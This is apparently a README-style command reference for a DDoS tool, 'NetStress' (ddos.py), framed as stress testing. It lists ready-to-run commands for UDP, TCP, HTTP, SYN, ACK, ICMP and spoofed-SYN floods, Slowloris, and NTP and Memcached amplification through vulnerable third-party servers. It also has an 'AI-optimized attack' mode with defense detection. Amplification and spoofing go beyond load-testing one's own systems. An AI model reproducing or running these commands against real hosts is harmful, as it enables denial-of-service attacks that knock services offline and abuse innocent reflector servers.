<h1 align="center">💻 Command Line Reference</h1>

<p align="center">
  <b>Complete guide to all NetStress command-line options</b>
</p>

---

## 📋 Table of Contents

- [Basic Syntax](#-basic-syntax)
- [Required Arguments](#-required-arguments)
- [Optional Arguments](#-optional-arguments)
- [Protocol Types](#-protocol-types)
- [Examples](#-examples)
- [Output Format](#-output-format)
- [Exit Codes](#-exit-codes)

---

## 🎯 Basic Syntax

```bash
python ddos.py -i <TARGET> -p <PORT> -t <PROTOCOL> [OPTIONS]
```

### Minimal Command

```bash
python ddos.py -i 192.168.1.100 -p 80 -t UDP
```

### Full Command

```bash
python ddos.py -i 192.168.1.100 -p 80 -t UDP -d 60 -x 8 -s 1472 -v --ai-optimize
```

---

## 📌 Required Arguments

### `-i, --ip` — Target Address

**Description:** Target IP address or hostname to test.

**Format:** IPv4 address or hostname

**Examples:**

```bash
# IPv4 address
python ddos.py -i 192.168.1.100 -p 80 -t UDP

# Hostname
python ddos.py -i example.com -p 80 -t HTTP

# Localhost (safe testing)
python ddos.py -i 127.0.0.1 -p 9999 -t UDP
```

---

### `-p, --port` — Target Port

**Description:** Target port number (1-65535).

**Format:** Integer between 1 and 65535

**Common Ports:**

| Port  | Service    | Protocol |
| ----- | ---------- | -------- |
| 80    | HTTP       | TCP      |
| 443   | HTTPS      | TCP      |
| 53    | DNS        | UDP/TCP  |
| 22    | SSH        | TCP      |
| 21    | FTP        | TCP      |
| 25    | SMTP       | TCP      |
| 3306  | MySQL      | TCP      |
| 5432  | PostgreSQL | TCP      |
| 6379  | Redis      | TCP      |
| 27017 | MongoDB    | TCP      |

**Examples:**

```bash
# Web server
python ddos.py -i TARGET -p 80 -t HTTP

# DNS server
python ddos.py -i TARGET -p 53 -t DNS

# Custom port
python ddos.py -i TARGET -p 8080 -t TCP
```

---

### `-t, --type` — Protocol Type

**Description:** Attack protocol to use.

**Available Protocols:**

| Protocol       | Description                | Root Required |
| -------------- | -------------------------- | ------------- |
| `UDP`          | UDP packet flood           | No            |
| `TCP`          | TCP connection flood       | No            |
| `HTTP`         | HTTP GET/POST flood        | No            |
| `HTTPS`        | HTTPS request flood        | No            |
| `DNS`          | DNS query flood            | No            |
| `ICMP`         | ICMP echo flood            | Yes           |
| `SLOW`         | Slowloris attack           | No            |
| `TCP-SYN`      | SYN packet flood           | Yes           |
| `TCP-ACK`      | ACK packet flood           | Yes           |
| `PUSH-ACK`     | PSH+ACK flood              | Yes           |
| `SYN-SPOOF`    | Spoofed SYN flood          | Yes           |
| `NTP`          | NTP amplification          | Yes           |
| `MEMCACHED`    | Memcached amplification    | Yes           |
| `WS-DISCOVERY` | WS-Discovery amplification | Yes           |
| `ENTROPY`      | High-entropy random data   | No            |

**Examples:**

```bash
# UDP flood
python ddos.py -i TARGET -p 80 -t UDP

# HTTP flood
python ddos.py -i TARGET -p 80 -t HTTP

# SYN flood (requires root)
sudo python ddos.py -i TARGET -p 80 -t TCP-SYN
```

---

## ⚙️ Optional Arguments

### `-d, --duration` — Test Duration

**Description:** How long to run the test in seconds.

**Default:** 60 seconds

**Range:** 1 - unlimited

**Examples:**

```bash
# 30 seconds
python ddos.py -i TARGET -p 80 -t UDP -d 30

# 5 minutes
python ddos.py -i TARGET -p 80 -t UDP -d 300

# 1 hour
python ddos.py -i TARGET -p 80 -t UDP -d 3600
```

---

### `-x, --threads` — Worker Threads

**Description:** Number of parallel worker threads.

**Default:** 4

**Recommendations:**

| CPU Cores | Recommended Threads |
| --------- | ------------------- |
| 2         | 2-4                 |
| 4         | 4-8                 |
| 8         | 8-16                |
| 16+       | 16-32               |

**Examples:**

```bash
# 8 threads
python ddos.py -i TARGET -p 80 -t UDP -x 8

# 16 threads (high-end system)
python ddos.py -i TARGET -p 80 -t UDP -x 16

# Slowloris (many connections)
python ddos.py -i TARGET -p 80 -t SLOW -x 500
```

---

### `-s, --size` — Packet Size

**Description:** Packet payload size in bytes.

**Default:** 1472 (optimal for MTU 1500)

**Range:** 1 - 65535

**Guidelines:**

| Size | Effect            | Use Case          |
| ---- | ----------------- | ----------------- |
| 64   | Maximum PPS       | Speed testing     |
| 512  | Balanced          | General testing   |
| 1472 | Maximum bandwidth | Bandwidth testing |

**Examples:**

```bash
# Small packets (high PPS)
python ddos.py -i TARGET -p 80 -t UDP -s 64

# Large packets (high bandwidth)
python ddos.py -i TARGET -p 80 -t UDP -s 1472

# Custom size
python ddos.py -i TARGET -p 80 -t UDP -s 256
```

---

### `-v, --verbose` — Verbose Output

**Description:** Enable detailed debug output.

**Default:** Off

**Example:**

```bash
python ddos.py -i TARGET -p 80 -t UDP -v
```

**Verbose output includes:**

- Detailed connection information
- Per-thread statistics
- Error details
- Backend selection info

---

### `--ai-optimize` — AI Optimization

**Description:** Enable AI-based attack optimization.

**Default:** Off

**Features:**

- Adaptive rate control
- Target response analysis
- Defense detection
- Parameter optimization

**Example:**

```bash
python ddos.py -i TARGET -p 80 -t UDP --ai-optimize
```

---

### `--status` — System Status

**Description:** Show system capabilities without running a test.

**Example:**

```bash
python ddos.py --status
```

**Output includes:**

- Platform information
- Available backends
- Module status
- Performance expectations

---

### `--insights` — Attack Insights

**Description:** Generate and display attack insights from previous runs.

**Example:**

```bash
python ddos.py --insights
```

---

### `--insights-confidence` — Insights Confidence

**Description:** Minimum confidence threshold for insights (0.0-1.0).

**Default:** 0.6

**Example:**

```bash
python ddos.py --insights --insights-confidence 0.8
```

---

### `--export-insights` — Export Insights

**Description:** Export insights to file.

**Format:** `json`

**Example:**

```bash
python ddos.py --insights --export-insights json
```

---

## 🔌 Protocol Types

### Layer 4 Protocols

<details>
<summary><b>UDP — UDP Packet Flood</b></summary>

**Description:** Sends UDP packets to the target.

**Root Required:** No

**Best For:** Bandwidth testing, DNS servers

**Example:**

```bash
python ddos.py -i TARGET -p 53 -t UDP -d 60
```

**Performance:** 100K-5M PPS (depending on system)

</details>

<details>
<summary><b>TCP — TCP Connection Flood</b></summary>

**Description:** Opens TCP connections and sends data.

**Root Required:** No

**Best For:** Connection handling testing

**Example:**

```bash
python ddos.py -i TARGET -p 80 -t TCP -d 60
```

**Performance:** 10K-500K connections/second

</details>

<details>
<summary><b>TCP-SYN — SYN Packet Flood</b></summary>

**Description:** Sends TCP SYN packets without completing handshake.

**Root Required:** Yes

**Best For:** Firewall testing, SYN flood simulation

**Example:**

```bash
sudo python ddos.py -i TARGET -p 80 -t TCP-SYN -d 60
```

</details>

<details>
<summary><b>TCP-ACK — ACK Packet Flood</b></summary>

**Description:** Sends TCP ACK packets.

**Root Required:** Yes

**Best For:** Firewall testing

**Example:**

```bash
sudo python ddos.py -i TARGET -p 80 -t TCP-ACK -d 60
```

</details>

<details>
<summary><b>ICMP — ICMP Echo Flood</b></summary>

**Description:** Sends ICMP echo requests (ping flood).

**Root Required:** Yes

**Best For:** Network layer testing

**Example:**

```bash
sudo python ddos.py -i TARGET -p 0 -t ICMP -d 60
```

</details>

### Layer 7 Protocols

<details>
<summary><b>HTTP — HTTP Request Flood</b></summary>

**Description:** Sends HTTP GET/POST requests.

**Root Required:** No

**Best For:** Web server testing

**Example:**

```bash
python ddos.py -i TARGET -p 80 -t HTTP -d 60 -x 8
```

</details>

<details>
<summary><b>HTTPS — HTTPS Request Flood</b></summary>

**Description:** Sends HTTPS requests with TLS.

**Root Required:** No

**Best For:** TLS server testing

**Example:**

```bash
python ddos.py -i TARGET -p 443 -t HTTPS -d 60
```

</details>

<details>
<summary><b>DNS — DNS Query Flood</b></summary>

**Description:** Sends DNS queries.

**Root Required:** No

**Best For:** DNS server testing

**Example:**

```bash
python ddos.py -i TARGET -p 53 -t DNS -d 60
```

</details>

<details>
<summary><b>SLOW — Slowloris Attack</b></summary>

**Description:** Opens connections and keeps them open with partial headers.

**Root Required:** No

**Best For:** Connection exhaustion testing

**Example:**

```bash
python ddos.py -i TARGET -p 80 -t SLOW -x 500 -d 300
```

**Note:** Use many threads (100-1000) for effectiveness.

</details>

### Amplification Protocols

<details>
<summary><b>NTP — NTP Amplification</b></summary>

**Description:** Uses NTP monlist for amplification (~556x).

**Root Required:** Yes

**Example:**

```bash
sudo python ddos.py -i TARGET -p 123 -t NTP -d 60
```

**⚠️ Warning:** Requires vulnerable NTP servers.

</details>

<details>
<summary><b>MEMCACHED — Memcached Amplification</b></summary>

**Description:** Uses Memcached for amplification (~50,000x).

**Root Required:** Yes

**Example:**

```bash
sudo python ddos.py -i TARGET -p 11211 -t MEMCACHED -d 60
```

**⚠️ Warning:** Requires vulnerable Memcached servers.

</details>

---

## 📝 Examples

### Basic Examples

```bash
# UDP flood for 60 seconds
python ddos.py -i 192.168.1.100 -p 80 -t UDP -d 60

# TCP flood with 8 threads
python ddos.py -i 192.168.1.100 -p 80 -t TCP -x 8 -d 60

# HTTP flood
python ddos.py -i 192.168.1.100 -p 80 -t HTTP -d 60
```

### Advanced Examples

```bash
# High-performance UDP flood
python ddos.py -i TARGET -p 80 -t UDP -x 16 -s 64 -d 120

# Slowloris with 500 connections
python ddos.py -i TARGET -p 80 -t SLOW -x 500 -d 300

# AI-optimized attack
python ddos.py -i TARGET -p 80 -t UDP --ai-optimize -d 60

# SYN flood (requires root)
sudo python ddos.py -i TARGET -p 80 -t TCP-SYN -d 60
```

### Testing Examples

```bash
# Safe localhost test
python ddos.py -i 127.0.0.1 -p 9999 -t UDP -d 10

# Check system capabilities
python ddos.py --status

# Verbose output for debugging
python ddos.py -i TARGET -p 80 -t UDP -v -d 30
```

---

## 📊 Output Format

### Real-Time Statistics

```
Stats: 125,432 pps | 1,476.80 Mbps | Errors: 0 (0.00%) | TCP: 0 | UDP: 125432 | HTTP: 0
```

| Field    | Description                         |
| -------- | ----------------------------------- |
| `pps`    | Packets per second                  |
| `Mbps`   | Megabits per second                 |
| `Errors` | Failed sends (count and percentage) |
| `TCP`    | TCP packets per second              |
| `UDP`    | UDP packets per second              |
| `HTTP`   | HTTP requests per second            |

### Final Report

```
════════════════════════════════════════════════════════════════
ATTACK COMPLETE
════════════════════════════════════════════════════════════════
Duration: 60.00s
Packets: 7,526,040
Data: 11.08 GB
PPS: 125,434
Bandwidth: 1,476.80 Mbps
Errors: 0 (0.00%)
════════════════════════════════════════════════════════════════
```

---

## 🔢 Exit Codes

| Code | Meaning              |
| ---- | -------------------- |
| 0    | Success              |
| 1    | General error        |
| 2    | Invalid arguments    |
| 130  | Interrupted (Ctrl+C) |

---

## 🆘 Getting Help

```bash
# Show help
python ddos.py --help

# Show version
python ddos.py --version

# Show system status
python ddos.py --status
```

---

<p align="center">
  <b>Need more help? Check the <a href="FAQ.md">FAQ</a> or <a href="TROUBLESHOOTING.md">Troubleshooting Guide</a>!</b>
</p>
